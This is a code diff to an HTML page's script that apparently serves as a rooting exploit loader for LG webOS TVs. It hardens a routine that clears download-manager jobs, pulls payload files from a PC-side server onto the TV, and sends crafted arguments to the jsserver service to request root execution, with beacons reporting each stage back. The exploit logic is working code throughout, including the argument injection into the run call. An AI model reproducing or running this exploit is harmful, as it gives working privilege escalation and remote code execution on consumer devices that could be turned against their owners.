@@ -15,20 +15,48 @@
   ];
   var status = document.getElementById("status");
   var started = false;
+  var failed = false;
 
   function bridge() {
-    var Bridge = typeof webOSServiceBridge === "function"
-      ? webOSServiceBridge
-      : PalmServiceBridge;
-    return new Bridge();
+    var Bridge = null;
+    if (typeof webOSServiceBridge === "function") {
+      Bridge = webOSServiceBridge;
+    } else if (typeof PalmServiceBridge === "function") {
+      Bridge = PalmServiceBridge;
+    }
+    if (Bridge === null) {
+      return null;
+    }
+    try {
+      return new Bridge();
+    } catch (error) {
+      return null;
+    }
   }
 
   function beacon(name, message) {
-    var image = new Image();
-    image.src = base + name + "?m=" + encodeURIComponent(message) + "&t=" + Date.now();
+    try {
+      var image = new Image();
+      image.src = base + name + "?m=" + encodeURIComponent(message) +
+        "&t=" + Date.now();
+    } catch (error) {
+      // The PC-side timeout handles a lost beacon.
+    }
+  }
+
+  function fail(stage, detail) {
+    if (failed) {
+      return;
+    }
+    failed = true;
+    status.textContent = "Failed: " + stage + " — do not reboot the TV";
+    beacon("compat-download", "ERROR " + stage + ": " + String(detail || ""));
   }
 
   function download(index) {
+    if (failed) {
+      return;
+    }
     if (index >= files.length) {
       status.textContent = "Payload ready; requesting root execution…";
       setTimeout(run, 1000);
@@ -37,54 +65,219 @@
 
     var source = files[index][0];
     var destination = files[index][1];
-    status.textContent = "Writing " + destination + " (" + (index + 1) + "/" + files.length + ")…";
     var b = bridge();
+    if (b === null) {
+      fail("bridge", "webOSServiceBridge is unavailable");
+      return;
+    }
+
     var finished = false;
+    var watchdog = setTimeout(function () {
+      if (finished) {
+        return;
+      }
+      finished = true;
+      try { b.cancel(); } catch (error) {}
+      fail("download-timeout", destination);
+    }, 15000);
+
+    status.textContent = "Writing " + destination + " (" +
+      (index + 1) + "/" + files.length + ")…";
+
     b.onservicecallback = function (message) {
-      beacon("compat-download", destination + ":" + message);
+      if (finished) {
+        return;
+      }
+
+      var response;
       try {
-        var response = JSON.parse(message);
-        if (!finished && response.completed === true && !response.aborted && !response.interrupted) {
-          finished = true;
-          setTimeout(function () { download(index + 1); }, 700);
+        response = JSON.parse(message);
+      } catch (error) {
+        finished = true;
+        clearTimeout(watchdog);
+        fail("download-response", destination + ": unparsable response");
+        return;
+      }
+
+      if (!response || typeof response !== "object") {
+        finished = true;
+        clearTimeout(watchdog);
+        fail("download-response", destination + ": response is not an object");
+        return;
+      }
+
+      if (response.hasOwnProperty("completed")) {
+        finished = true;
+        clearTimeout(watchdog);
+        try { b.cancel(); } catch (error) {}
+
+        // The tested webOS 26 diagnostic accepted completion messages that omit
+        // httpStatus. Reject a numeric non-2xx status, but do not require the
+        // field when the service omits it.
+        var badStatus = (typeof response.httpStatus === "number" &&
+          (response.httpStatus < 200 || response.httpStatus >= 300));
+        if (response.completed !== true || response.aborted === true ||
+            response.interrupted === true || badStatus) {
+          fail("download", destination + ": " +
+            JSON.stringify(response).substring(0, 300));
+          return;
         }
-      } catch (_) {}
+
+        beacon("compat-download", destination + ": completed HTTP " +
+          (typeof response.httpStatus === "number"
+            ? response.httpStatus : "unknown"));
+        status.textContent = "Downloaded " + destination + " (" +
+          (index + 1) + "/" + files.length + ")";
+        setTimeout(function () { download(index + 1); }, 700);
+        return;
+      }
+
+      if (response.returnValue === false) {
+        finished = true;
+        clearTimeout(watchdog);
+        try { b.cancel(); } catch (error) {}
+        fail("download-rejected", destination + ": " +
+          String(response.errorText || response.error || "unknown error"));
+      }
+      // Otherwise this is a progress response; keep waiting.
     };
-    b.call("luna://com.webos.service.downloadmanager/download", JSON.stringify({
-      target: base + source,
-      targetDir: targetDir,
-      targetFilename: destination,
-      subscribe: true
-    }));
+
+    try {
+      b.call("luna://com.webos.service.downloadmanager/download", JSON.stringify({
+        target: base + source,
+        targetDir: targetDir,
+        targetFilename: destination,
+        subscribe: true
+      }));
+    } catch (error) {
+      finished = true;
+      clearTimeout(watchdog);
+      fail("download", destination + ": " + String(error && error.message || error));
+    }
   }
 
   function run() {
+    if (failed) {
+      return;
+    }
+
     var b = bridge();
-    b.onservicecallback = function (message) {
-      status.textContent = "Run response: " + message;
-      beacon("compat-run-result", message);
-    };
+    if (b === null) {
+      fail("bridge", "webOSServiceBridge is unavailable");
+      return;
+    }
+
     // Match the trusted-path argument position used by SlopBro v0.1.0 while
     // retaining the compatible loader's existing jsserver invocation.
     var payload = {
       inputParams: "a b c " + trustedServicePath + " -- /tmp/cgroup dummy " + targetDir
     };
     beacon("compat-run-request", JSON.stringify(payload));
-    b.call("luna://com.webos.service.jsserver/run", JSON.stringify(payload));
+    status.textContent = "Requesting root execution…";
+
+    var answered = false;
+    var watchdog = setTimeout(function () {
+      if (answered) {
+        return;
+      }
+      answered = true;
+      status.textContent = "No service response; result unknown";
+      beacon("compat-download", "ERROR run-timeout");
+    }, 15000);
+
+    b.onservicecallback = function (message) {
+      if (answered) {
+        return;
+      }
+      answered = true;
+      clearTimeout(watchdog);
+
+      var response;
+      try {
+        response = JSON.parse(message);
+      } catch (error) {
+        response = null;
+      }
+      if (!response || typeof response.returnValue !== "boolean") {
+        status.textContent = "Invalid service response; result unknown";
+        beacon("compat-download", "ERROR invalid-service-response: " +
+          String(message).substring(0, 300));
+        return;
+      }
+
+      status.textContent = "Run response: " + message;
+      beacon("compat-run-result", message);
+    };
+
+    try {
+      b.call("luna://com.webos.service.jsserver/run", JSON.stringify(payload));
+    } catch (error) {
+      answered = true;
+      clearTimeout(watchdog);
+      status.textContent = "Run request failed";
+      beacon("compat-download", "ERROR run-request: " +
+        String(error && error.message || error));
+    }
   }
 
   function startDownloads() {
-    if (started) return;
+    if (started || failed) {
+      return;
+    }
     started = true;
     download(0);
   }
 
   var cancel = bridge();
+  if (cancel === null) {
+    fail("bridge", "webOSServiceBridge is unavailable");
+    return;
+  }
+
+  status.textContent = "Clearing stale download-manager jobs…";
+  // Start only after the Download Manager explicitly acknowledges the cancel.
+  // The service acknowledgement is the only cleanup confirmation available.
+  var cancelSettled = false;
+  var cancelWatchdog = setTimeout(function () {
+    if (cancelSettled) {
+      return;
+    }
+    cancelSettled = true;
+    fail("cancel-timeout", "cancelAllDownloads did not confirm completion");
+  }, 2500);
+
   cancel.onservicecallback = function (message) {
+    if (cancelSettled) {
+      return;
+    }
+    cancelSettled = true;
+    clearTimeout(cancelWatchdog);
+
+    var response;
+    try {
+      response = JSON.parse(message);
+    } catch (error) {
+      fail("cancel-response", "unparsable cancelAllDownloads response");
+      return;
+    }
+    if (!response || response.returnValue !== true) {
+      fail("cancel-rejected", "cancelAllDownloads was not confirmed: " +
+        String(message).substring(0, 300));
+      return;
+    }
+
     beacon("compat-cancel", message);
     setTimeout(startDownloads, 800);
   };
-  cancel.call("luna://com.webos.service.downloadmanager/cancelAllDownloads", "{}");
-  setTimeout(startDownloads, 2500);
+
+  try {
+    cancel.call("luna://com.webos.service.downloadmanager/cancelAllDownloads", "{}");
+  } catch (error) {
+    cancelSettled = true;
+    clearTimeout(cancelWatchdog);
+    fail("cancel", String(error && error.message || error));
+  }
 })();
 </script>
+</body>
+</html>
